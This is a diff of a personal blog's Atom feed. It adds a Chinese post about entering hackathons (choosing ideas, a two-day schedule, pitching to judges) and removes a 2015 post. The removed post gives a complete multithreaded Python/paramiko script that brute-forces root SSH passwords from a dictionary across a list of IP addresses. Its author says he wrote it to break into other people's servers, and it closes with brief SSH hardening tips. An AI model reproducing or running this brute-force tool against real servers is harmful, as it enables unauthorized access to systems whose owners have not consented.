@@ -5,7 +5,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="http://homeway.me/"/>
-  <updated>2018-01-28T08:07:50.000Z</updated>
+  <updated>2018-05-21T18:32:47.952Z</updated>
   <id>http://homeway.me/</id>
   
   <author>
@@ -14,6 +14,78 @@
   </author>
   
   <generator uri="http://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>Talking about Hackathon</title>
+    <link href="http://homeway.me/2018/05/21/talking-about-hackathon/"/>
+    <id>http://homeway.me/2018/05/21/talking-about-hackathon/</id>
+    <published>2018-05-21T12:57:10.000Z</published>
+    <updated>2018-05-21T18:32:47.952Z</updated>
+    
+    <content type="html"><![CDATA[<p><br><br><img src="https://static.blog.homeway.me/blog/logo/hackathon-logo.png" alt="Hackathon"><br><a id="more"></a></p>
+<h1 id="About"><a href="#About" class="headerlink" title="About"></a>About</h1><p>上周周末刚刚参加了一场“Hack{中国}全国高校黑客马拉松比赛”，想着写篇简单的感悟。<br>比赛上遇见了几个学霸级队友，非常感叹现在的本科生这么厉害，都是未来改变世界的人才。<br>我从本科开始就在关注Hackathon，前前后后大概参加了六七次比赛，现在再参加这种比赛有点欺负晚辈们了。<br>Hackathon的初衷是为了在很短时间内快速开发，通过压缩时间、提高效率，把原本懒散想做的一些项目、创意在非常短的时间内完成。<br>我在经常参加Hackathon后，也不断磨练出了很强的短时间爆发能力，规划时间、提高效率、团队合作。</p>
+<p>接下来说下我这些年参加Hackathon的一些总结：</p>
+<h2 id="1-做什么"><a href="#1-做什么" class="headerlink" title="1.做什么"></a>1.做什么</h2><p>首先是做什么。源于Hackathon开放的思维氛围，大部分Hackathon都不限制选手们做什么，有些仅仅会提出一个相关的主题，这也不影响选手们做什么。大概在2014年的时候，由于移动端的火热，大片大片围绕移动互联网的应用在比赛中流行起来，那个时候做个简单的移动app，有些创意度、完整性、演示良好都能拿奖了；到后来，大家疲惫于移动app、web应用，很多有创意的硬件Geek们开始用硬件来做很多想法，各种类型的智能设备、感官游戏、无人飞行器、3D打印，这些都取得很好的效果；近年来，随着深度学习的兴旺以及国家大力支持智慧城市，很多深度学习算法开始走进Hackathon比赛中，这些项目中，有些很好地解决很多现实问题、有些则是很有创意的吸引眼球。</p>
+<p>早期的一些作品，例如：App List，应用分享的应用，利用app选择手机自带的十个自己已使用的app，并且分享给好友，同时能看到自己好友及附近的朋友的分享，并且下载自己喜欢的应用。这个idea现在想来已经很老套了，2014年还是很有新鲜感的。</p>
+<p><img src="http://segmentfault.com/img/bVcDV8" alt="App List"></p>
+<p>后来开始流行做小游戏，例如：剑气决斗，让手机变身宝剑，通过手机3D感应器来操控游戏！纯js作品，应用使用PhoneGap，后端使用NodeJS、WebSocket，HTML5 页面，使用了云适配的技术，可以适配各种大小的屏幕，这个作品也是拿奖作品。这种游戏创意点非常足，现场演示起来效果也非常棒，有动作、有声音、有激情点，可以很好地把评委带进演讲者氛围里，非常适合演示，缺点之一就是商业性匮乏，但是拿个奖已经足够了。<br><img src="http://segmentfault.com/img/bVbV4m" alt="剑气决斗"></p>
+<p>还有各种硬件游戏，例如：SMAUSH，将刷牙变成一场游戏。主要思路是在牙刷中放入传感器，通过蓝牙传输到后台控制端，另一端连接web游戏界面，显示游戏画面，这款游戏也是拿奖作品。这个游戏和上一个很相似，画面感很足，很容易吸引评委，想想评委坐在那里听一堆无聊的解说也是很烦的。<br><img src="http://segmentfault.com/img/bVbV3v" alt="SMAUSH"></p>
+<p>还有做一款味蕾应用，通过传导味蕾来找到交友人群，想法很有意思，创意点很足。这种应用很大的特点就是创意性，给人一种启发，但是演示时候由于味觉第三者谁也没法说什么相同不同，没法证明什么，这点比较遗憾，如果能在结果上面加上修饰，有声音、动画，也可以展示一番。<br><img src="http://segmentfault.com/img/bVbV04" alt="味蕾"></p>
+<p>从我参加Hackathon的经历来看，我大部分做的项目都是跟游戏有关，基本上都是带几个队友同时现场再找几个队友。<br>很多时候参加比赛都是破釜沉舟，现场决定idea、现场找队友，因为现场往往会碰到很多很牛逼的队友，下面是我获奖的一些idea：</p>
+<p>2014年6月，在SegmentFault黑客马拉松做了基于Bong手环的传感数据养宠物智能硬件游戏，并获得了Bong手环专项奖；<br>2015年3月，在沪港全球黑客马拉松做了<a href="http://homeway.me/2015/03/30/play-music-through-senses/">基于Raspberry的体感音乐游戏</a>并获得了一等奖；<br>2015年5月，在安空杯黑客马拉松做了<a href="http://homeway.me/2015/05/26/play-hamster-game-through-raspberry/">基于Raspberry的打地鼠游戏</a>并获得了二等奖；<br>上周参加了全国高校黑客马拉松比赛，做了一个基于心率感应的智能跳舞机，获得了一等奖、心率传感专项奖。</p>
+<p>从2015年华科联创的Unique Hackday没拿奖开始就发现，智能硬件游戏已经遍地开花，想要获奖似乎已经没有那么简单了。<br>越来越多的开发者开始朝着深度学习、虚拟现实、区块链方向转移了，不管怎么说创新性是有了，就是作品的完整度、表现力似乎还不够。</p>
+<p>中国黑客马拉松比赛中看到了很多后起之秀，有做深度学习相关的智能诊断病症、智能交通、智能行人捕捉等等项目，这些想法都非常棒。<br>今年6月，SegmentFault将要举行的区块链Hackathon就很有创新，顺应时代，把最新的技术引到Hackathon上面，非常看好。</p>
+<h2 id="2-怎么做"><a href="#2-怎么做" class="headerlink" title="2.怎么做"></a>2.怎么做</h2><p>怎么做非常重要了。来参赛可以没有队友、没有idea，但是确定了做一样东西后，怎么做就非常关键了。<br>正常来说，一个成型的队伍，根据需求可能需要有前端/App界面端、后端、硬件端、产品/设计等，不用太多人。<br>对于提高效率来说，定个时间表、交互的数据结构、交互方式是非常必要的，这样交接起来就非常快速了。</p>
+<p>按照参赛的经验（对于2天的比赛），时间可以大致这么安排：</p>
+<ul>
+<li>基本上都是第一天12点前确定做什么，每个人分配模块任务；</li>
+<li>约定个交接时间段，15、18点交接每个模块的进度，做初步的通信交互；</li>
+<li>接下来是联通过程，22点前大致地模块都要完成，开始准备交接，24点前可以交接完成；</li>
+<li>往往在交接完成后会出现bug，而大家这时候都比较疲惫，主力需要协调大家进行快速解决问题，尽量在3点前完成bug的调试，完整地跑几次，然后就去休息了；</li>
+<li>第二天8点前开始封装产品界面，同时测试团队调试产品模型，产品经理写产品文档、演讲稿；</li>
+<li>第二天10点前要做完备的各种调试、测试、包装产品（有时候会有评委提前路过，要展示最好的状态，可以邀请他们观看）；</li>
+<li>12点前要做上台的演讲准备，整个上台流程走几遍，包括环境布置、现场意外、演讲人的演讲要点理清（很多人没做这点出意外）；</li>
+<li>12点前提交最终项目文档、代码，记得提前上路演台看看显示器接口、音箱。</li>
+</ul>
+<p>上面都是些基本的时间安排，往往很多人都只注重开发过程效率问题忽略了模拟路演过程，我拿奖的比赛都是经过提前模拟路演的。<br>很有意思的是，之前参加的比赛都是带着拿奖的决心、娱乐的心态在玩的，每次都会在傍晚和队友吃完饭出去散步、逛超市买设备。</p>
+<h2 id="3-怎么说"><a href="#3-怎么说" class="headerlink" title="3.怎么说"></a>3.怎么说</h2><p>很多人觉得Hackathon没意思都在于觉得它不公平，而这不公平往往来自于觉得这个东西靠骗。<br>其实并不是这样，程序员大都自我满足，然而很多人做了很牛逼的项目却不会表达，最后上台话都没说清。</p>
+<p>为了迎合评委，我经常会在做的东西里面加入很多元素，<br>比如：评委年龄段（适合啥背景音乐、说些什么话得体）；现场做哪个东西的人多，不要撞车；现场演示要怎么跟观众互动起来，展示者手势、肢体动作，演讲者说话重点；比赛评分要求占比是怎样的；怎么表达可以让评委一下子知道我们解决什么问题、创意点在哪、工作量充分、作品完整。其实把上面这些点都做了非常难，但是做到一部分就很完美了，很差的项目都可能拿奖。</p>
+<p>很羞耻的放一个这次比赛的视频：</p>
+<video src="https://static.blog.homeway.me/blog/video/2018.05.21-HDU-Hackday-play.mp4" controls="controls"></video>
+
+<p>可以从视频看出来，演讲者很努力把每个部件的功能结合表演者的动作向评委解释清楚，同时表演者故意装出很多肢体动作来吸引评委。</p>
+<hr>
+<h1 id="Game"><a href="#Game" class="headerlink" title="Game"></a>Game</h1><p>接下来说说这场比赛吧，因为还是很有意思的，从一开始到最后都没有太多期待，但是得到太多回馈。<br>比赛当天一个人到现场，没想到具体要做什么、没有很确定的队友，现场找人还被人拒绝，直到后来开始通过经历忽悠才找来队友。<br>有几个队友非常牛逼的，不但名校出身而且大一大二就准备好出国留学的地方了，非常羡慕。</p>
+<p>下面是一些现场照片：</p>
+<p><img src="https://static.blog.homeway.me/blog/image/2018.05.21-HDU-Hackday.jpg" alt="2点多的现场"></p>
+<p><img src="https://static.blog.homeway.me/blog/image/2018.05.21-HDU-Hackday-team1.jpg" alt="团队照片1"></p>
+<p><img src="https://static.blog.homeway.me/blog/image/2018.05.21-HDU-Hackday-team2.jpg" alt="团队照片2"></p>
+<p><img src="https://static.blog.homeway.me/blog/image/2018.05.21-HDU-Hackday-reward1.jpg" alt="获奖照片1"></p>
+<p><img src="https://static.blog.homeway.me/blog/image/2018.05.21-HDU-Hackday-reward2.jpg" alt="获奖照片2"></p>
+<hr>
+<h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><ul>
+<li><a href="https://segmentfault.com/a/1190000000591097" target="_blank" rel="external">SegmentFault 2014黑客马拉松 北京 作品demo</a></li>
+<li><a href="https://segmentfault.com/a/1190000000591097" target="_blank" rel="external">2014 沪港黑客马拉松现场直播 Demo环节</a></li>
+<li><a href="http://www.pingwest.com/2014-shanghai-hk-hackathon/" target="_blank" rel="external">味觉模拟器、牙刷版Wii、无需联网的LBS：黑客马拉松如何改变我们的生活？</a></li>
+</ul>
+<hr>
+<h4 id="本文出自-夏日小草-转载请注明出处-http-homeway-me-2018-05-21-talking-about-hackathon"><a href="#本文出自-夏日小草-转载请注明出处-http-homeway-me-2018-05-21-talking-about-hackathon" class="headerlink" title="本文出自 夏日小草,转载请注明出处:http://homeway.me/2018/05/21/talking-about-hackathon/"></a>本文出自 <a href="http://homeway.me">夏日小草</a>,转载请注明出处:<a href="http://homeway.me/2018/05/21/talking-about-hackathon/">http://homeway.me/2018/05/21/talking-about-hackathon/</a></h4><blockquote>
+<p>by grasses 2018.05.21</p>
+</blockquote>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;&lt;br&gt;&lt;br&gt;&lt;img src=&quot;https://static.blog.homeway.me/blog/logo/hackathon-logo.png&quot; alt=&quot;Hackathon&quot;&gt;&lt;br&gt;
+    
+    </summary>
+    
+      <category term="Summary" scheme="http://homeway.me/categories/Summary/"/>
+    
+    
+      <category term="hackathon" scheme="http://homeway.me/tags/hackathon/"/>
+    
+  </entry>
   
   <entry>
     <title>Deep Learning - Installing Caffe on Ubuntu</title>
@@ -2906,139 +2978,6 @@ make install
     
     
       <category term="Nginx" scheme="http://homeway.me/tags/Nginx/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>python多线程ssh爆破</title>
-    <link href="http://homeway.me/2015/06/20/python-violence-ssh-attack/"/>
-    <id>http://homeway.me/2015/06/20/python-violence-ssh-attack/</id>
-    <published>2015-06-20T11:07:54.000Z</published>
-    <updated>2015-08-04T13:58:33.000Z</updated>
-    
-    <content type="html"><![CDATA[<p><br></p>
-<p><img src="http://77l5jp.com1.z0.glb.clouddn.com/blog/logo-python.png" alt="Python"></p>
-<a id="more"></a>
-<p><br><hr><br></p>
-<h1 id="0x01-About"><a href="#0x01-About" class="headerlink" title="0x01.About"></a>0x01.About</h1><p>这几天发现朋友的服务器22被人爆了，于是想想，也想去爆别人服务器。</p>
-<p>爆弱口令时候写的一个python小脚本，主要功能是实现使用字典多线程爆破ssh，支持ip表导入，字典数据导入。</p>
-<p>主要使用到的是python的paramiko模块和多线程threading模块。</p>
-<p>那么，首先要准备的是字典dict、服务器ip表。</p>
-<p>东西很简单，主要默认目录如下：</p>
-<pre><code>|--ssh.scan.py
-|--/log:
-    sshd
-|--/dict:
-    ip
-    password
-</code></pre><p>ip和password按照一行一个放置。</p>
-<p><hr><br></p>
-<h1 id="0x02-Code"><a href="#0x02-Code" class="headerlink" title="0x02.Code"></a>0x02.Code</h1><p>下面上源码吧，文件保存为<code>ssh.scan.py</code>，查看使用方式：<code>python ssh.scan.py -h</code></p>
-<pre><code>#!/usr/bin/python python
-# -*- coding: utf-8 -*-
-import paramiko,threading,sys,time,os
-
-class SSHThread(threading.Thread):
-    def __init__(self, ip, port, timeout, dic, LogFile):
-        threading.Thread.__init__(self)
-        self.ip = ip
-        self.port = port
-        self.dict = dic
-        self.timeout = timeout
-        self.LogFile = LogFile
-    def run(self):
-        print(&quot;Start try ssh =&gt; %s&quot; % self.ip)
-        username = &quot;root&quot;
-        try:
-            password = open(self.dict).read().split(&#39;\n&#39;)
-        except:
-            print(&quot;Open dict file `%s` error&quot; % self.dict)
-            exit(1)
-        for pwd in password:
-            try:
-                ssh = paramiko.SSHClient()
-                ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
-                ssh.connect(self.ip, self.port, username, pwd, timeout = self.timeout)
-                print(&quot;\nIP =&gt; %s, Login %s =&gt; %s \n&quot; % (self.ip, username, pwd))
-                open(self.LogFile, &quot;a&quot;).write(&quot;[ %s ] IP =&gt; %s, port =&gt; %d, %s =&gt; %s \n&quot; % (time.asctime( time.localtime(time.time()) ), self.ip, self.port, username, pwd))
-                break
-            except:
-                print(&quot;IP =&gt; %s, Error %s =&gt; %s&quot; % (self.ip, username, pwd))
-                pass
-def ViolenceSSH(ip, port, timeout, dic, LogFile):
-    ssh_scan = SSHThread(ip, port, timeout, dic, LogFile)
-    ssh_scan.start()
-
-def main(ipFile, dic, log):
-    if ipFile == &quot;-h&quot;:
-        help()
-    try:
-        ipText = open(ipFile).read().split(&#39;\n&#39;)
-        for ip in ipText:
-            if ip != &#39;&#39;:
-                time.sleep(0.5)
-                threading.Thread(target = ViolenceSSH, args = (ip, 22, 1, dic, log, )).start()
-    except:
-        print(&quot;Open IP list file `%s` error&quot; % ipFile)
-        exit(1)
-def help():
-    print(&quot;python ssh.scan.py 使用说明:\n\
-        python ssh.scan.py ip_file_path dict_file_path ssh_log_path \n&quot;)
-    exit(1)
-
-if __name__ == &#39;__main__&#39;:
-
-    fpath = os.path.dirname(os.path.abspath(&#39;__file__&#39;))
-    ipFile = sys.argv[1] if len(sys.argv) &gt; 1 else fpath+&quot;/dict/ip&quot; 
-    dic = sys.argv[2] if len(sys.argv) &gt; 2 else fpath+&quot;/dict/password&quot;
-    log = sys.argv[3] if len(sys.argv) &gt; 3 else fpath+&quot;/log/sshd&quot;
-    try:
-        os.system(&quot;clear&quot;)
-        main(ipFile, dic, log)
-    except KeyboardInterrupt:
-        exit(1)
-</code></pre><p>结果比较丑，自己爆自己服务器：</p>
-<p><img src="http://77l5jp.com1.z0.glb.clouddn.com/blog/2015-06-20-python-violence-ssh-attack-1.jpg" alt="爆破结果"></p>
-<p><hr><br></p>
-<h1 id="0x03-Solution"><a href="#0x03-Solution" class="headerlink" title="0x03.Solution"></a>0x03.Solution</h1><p>怎么办呢？防止被人爆菊，那就修改ssh默认登陆端口吧。修改方式主要是修改ssh配置文件：</p>
-<h2 id="1-修改iptables"><a href="#1-修改iptables" class="headerlink" title="1.修改iptables"></a>1.修改iptables</h2><p>首先要过防火墙，修改防火墙规则：</p>
-<p><code>/sbin/iptables -A INPUT -m state --state NEW -m tcp -p tcp --dport 2333 -j ACCEPT</code></p>
-<p>保存规则：</p>
-<p><code>service iptables save</code></p>
-<p>重启防火墙：</p>
-<p><code>service iptables restart</code></p>
-<h2 id="2-修改ssh配置文件"><a href="#2-修改ssh配置文件" class="headerlink" title="2.修改ssh配置文件"></a>2.修改ssh配置文件</h2><p><code>cp /etc/ssh/ssh_config   /etc/ssh/ssh_config.bak</code><br><code>cp /etc/ssh/sshd_config  /etc/ssh/sshd_config.bak</code></p>
-<p>修改ssh端口：</p>
-<p><code>vim /etc/ssh/sshd_config</code></p>
-<p>在端口#Port 22下面增加Port 2333</p>
-<p><code>vim /etc/ssh/ssh_config</code></p>
-<p>在端口#Port 22下面增加Port 2333</p>
-<p>重启ssh服务：</p>
-<p><code>service sshd restart</code></p>
-<h2 id="3-其他修改"><a href="#3-其他修改" class="headerlink" title="3.其他修改"></a>3.其他修改</h2><p>限制用户的SSH访问</p>
-<p>假设我们只要xiaocao和homeway用户能通过SSH使用系统，向sshd_config配置文件中添加</p>
-<p><code>vim /etc/ssh/sshd_config</code></p>
-<p>修改下面一行：</p>
-<p>AllowUsers xiaocao homeway</p>
-<p><br></p>
-<p>代码下载地址：<a href="http://homeway.me/code/python-violence-ssh.zip">http://homeway.me/code/python-violence-ssh.zip</a></p>
-<p><br><hr><br></p>
-<h5 id="本文出自-夏日小草-转载请注明出处-http-homeway-me-2015-06-20-python-violence-ssh-attack"><a href="#本文出自-夏日小草-转载请注明出处-http-homeway-me-2015-06-20-python-violence-ssh-attack" class="headerlink" title="本文出自 夏日小草,转载请注明出处: http://homeway.me/2015/06/20/python-violence-ssh-attack"></a>本文出自 <a href="http://homeway.me">夏日小草</a>,转载请注明出处:<a href="http://homeway.me/2015/06/20/python-violence-ssh-attack"> http://homeway.me/2015/06/20/python-violence-ssh-attack</a></h5><p><br></p>
-<p>-by小草</p>
-<p>2015-06-20 19:59:54</p>
-]]></content>
-    
-    <summary type="html">
-    
-      &lt;p&gt;&lt;br&gt;&lt;/p&gt;
-&lt;p&gt;&lt;img src=&quot;http://77l5jp.com1.z0.glb.clouddn.com/blog/logo-python.png&quot; alt=&quot;Python&quot;&gt;&lt;/p&gt;
-    
-    </summary>
-    
-      <category term="Tech" scheme="http://homeway.me/categories/Tech/"/>
-    
-    
-      <category term="Python" scheme="http://homeway.me/tags/Python/"/>
     
   </entry>
   
